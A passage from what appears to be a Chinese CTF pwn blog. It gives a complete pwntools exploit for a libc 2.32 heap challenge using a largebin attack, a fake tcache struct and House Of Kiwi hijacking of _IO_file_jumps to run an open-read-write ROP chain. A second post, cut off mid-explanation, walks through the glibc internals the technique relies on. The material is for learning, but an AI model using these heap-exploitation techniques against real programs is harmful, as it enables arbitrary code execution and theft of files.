<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_arena</span><br><span class="line">$<span class="number">2</span> = (struct malloc_state *) <span class="number">0x7fddd4bf7ba0</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[anon_7fddd4a11] <span class="number">0x7fddd4a11708</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">libc<span class="number">-2.32</span>.so    <span class="number">0x7fddd4bf8410</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22af50</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22afd0</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7ffd6e22b090</span> <span class="number">0x7fddd4bf7ba0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fddd4a11708</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fddd4a116e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fddd4a116f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fddd4a116f8</span> —▸ <span class="number">0x563469070010</span> ◂— <span class="number">0x0</span> <span class="comment">/* target */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fddd4a11700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fddd4a11708</span> —▸ <span class="number">0x7fddd4bf7ba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>接下来就通过 largebin attack 来修改 <code>0x7fddd4a116f8</code> 处存储的 tcache struct addr：</p>
<ul>
<li>由于前面已经实现了 heap overlapping，存在一个大 chunk，其中包含了一个小 chunk，两者都可以被控制</li>
<li>于是我们先释放小 chunk，再释放大 chunk</li>
<li>接下来申请大 chunk，在小 chunk 中完成 large attack 的布局</li>
</ul>
<p>进行攻击前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8bed8866e8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8bed8866e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8bed8866f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8bed8866f8</span> —▸ <span class="number">0x55e24e3f2010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8bed886700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8bed886708</span> —▸ <span class="number">0x7f8beda6cba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>进行攻击后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8bed8866e8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8bed8866e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8bed8866f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8bed8866f8</span> —▸ <span class="number">0x55e24e3f3350</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8bed886700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8bed886708</span> —▸ <span class="number">0x7f8beda6cba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>而 <code>0x350</code> 也是可控地址，申请这片区域然后在此伪造 fake tcache struct，分别布置好 <code>IO_file_jumps+0x60</code>， <code>IO_helper_jumps+0xa0</code>， <code>top_heap</code></p>
<p>House Of Kiwi 的攻击基本上已经完成了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">&#x27;\x00&#x27;</span></span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x11B2)\nb *$rebase(0x11C2)\nb *$rebase(0x1183)\n&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e4230</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">open_libc=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">IO_file_jumps=<span class="number">0x1e54c0</span>+libc_base</span><br><span class="line">IO_helper_jumps=<span class="number">0x1e48c0</span>+libc_base</span><br><span class="line">success(<span class="string">&quot;IO_file_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_file_jumps))</span><br><span class="line">success(<span class="string">&quot;IO_helper_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_helper_jumps))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x2858f</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x2ac3f</span>+libc_base</span><br><span class="line">pop_rdx_pop_rbx_ret=<span class="number">0x1597d6</span>+libc_base</span><br><span class="line">ret=<span class="number">0x26699</span>+libc_base</span><br><span class="line">success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rsi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rsi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rdx_pop_rbx_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdx_pop_rbx_ret))</span><br><span class="line">success(<span class="string">&quot;ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">TLS=libc_base-<span class="number">0x2908</span></span><br><span class="line">success(<span class="string">&quot;TLS &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(TLS))</span><br><span class="line"></span><br><span class="line">ORW_addr = heap+<span class="number">0x8e0</span></span><br><span class="line">flag_addr = heap + <span class="number">0x8e0</span> + <span class="number">0x268</span></span><br><span class="line">chain = flat(pop_rdi_ret , flag_addr , pop_rsi_ret , <span class="number">0</span> , open_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">3</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , read_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">1</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , write_libc).ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x211</span>)+<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xa01</span>)) <span class="comment"># padding-不要破坏原来的chunk结构</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,chain) <span class="comment"># 0-chain</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#12</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)+p64(TLS-<span class="number">0x20</span>)) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># largebin attack</span></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">top_heap = heap+<span class="number">0x46f0</span></span><br><span class="line">fake_tcache_struct=<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">fake_tcache_struct=fake_tcache_struct.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(IO_file_jumps+<span class="number">0x60</span>)</span><br><span class="line">fake_tcache_struct=fake_tcache_struct.ljust(<span class="number">0x168</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(IO_helper_jumps+<span class="number">0xa0</span>)+p64(top_heap)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x420</span>,fake_tcache_struct) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>,p64(setcontext+<span class="number">61</span>))</span><br><span class="line">add(<span class="number">0x200</span>,p64(ORW_addr)+p64(ret))</span><br><span class="line">add(<span class="number">0x210</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x910</span>))</span><br><span class="line"></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题的堆风水真是够呛，好在让我整理学习了一些思路，以后按照这个来改应该没有问题</p>
<p>我还重新复习了下 off-by-one 和 unlink 的基础检查，各个 libc 版本的源码都对比着看了看，算是把以前的东西捡起来了吧</p>
<p>学习使用了 House Of Kiwi</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/04/House%20Of%20Kiwi-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/04/House%20Of%20Kiwi-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Kiwi-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-04 16:46:58 / Modified: 16:47:47" itemprop="dateCreated datePublished" datetime="2022-08-04T16:46:58+08:00">2022-08-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Kiwi"><a href="#House-Of-Kiwi" class="headerlink" title="House Of Kiwi"></a>House Of Kiwi</h2><p>House Of Kiwi 使用了一条新的调用链，适用于高版本的 libc 版本</p>
<p>使用条件：</p>
<ul>
<li>能够触发 <code>__malloc_assert</code>（通常是堆溢出导致）</li>
<li>能够任意写 WAA（修改 <code>_IO_file_sync</code> 和 <code>IO_helper_jumps + 0xA0 and 0xA8</code>）</li>
</ul>
<hr>
<h2 id="House-Of-Kiwi-原理"><a href="#House-Of-Kiwi-原理" class="headerlink" title="House Of Kiwi 原理"></a>House Of Kiwi 原理</h2><p>House Of Kiwi 需要 <code>__malloc_assert</code> 进行触发，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">		 <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>fflush(stderr)</code> 会调用 <code>_IO_file_jumps</code> 中的 sync 指针</li>
<li>注意这里是 <code>stderr</code> 的 <code>_IO_file_jumps</code>（在 GDB 上看到的第一个 <code>_IO_file_jumps</code>），<code>stdin</code> 和 <code>stdout</code> 也有 <code>_IO_file_jumps</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_jumps jumps</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync), <span class="comment">/* target */</span></span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_file_jumps)</span><br><span class="line">    </span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以提前修改 <code>_IO_file_jumps-&gt;_IO_file_sync</code>，进行后续利用</li>
</ul>
<p>那么 <code>__malloc_assert</code> 怎么触发呢？</p>
<p><code>_int_malloc</code> 中存在以下的 assert：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line">assert (chunk_main_arena (bck-&gt;bk)) </span><br></pre></td></tr></table></figure>
<ul>
<li>判断 bck-&gt;bk 是不是在 main_arena 中（bck-&gt;bk 存储着相应 largebin 中最小的 chunk）</li>
<li>破坏 chunk-&gt;A 就可以触发 <code>__malloc_assert</code></li>
</ul>
<p><code>sysmalloc</code> 中存在以下的 assert：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>
<ul>
<li>会进行以下判断：<ul>
<li>old_size &gt;= 0x20</li>
<li>old_top.prev_inuse = 0</li>
<li>old_top 页对齐</li>
</ul>
</li>
</ul>
<p>我们故意破坏 chunk 结构，然后进行调试：（sysmalloc 处的 assert）</p>
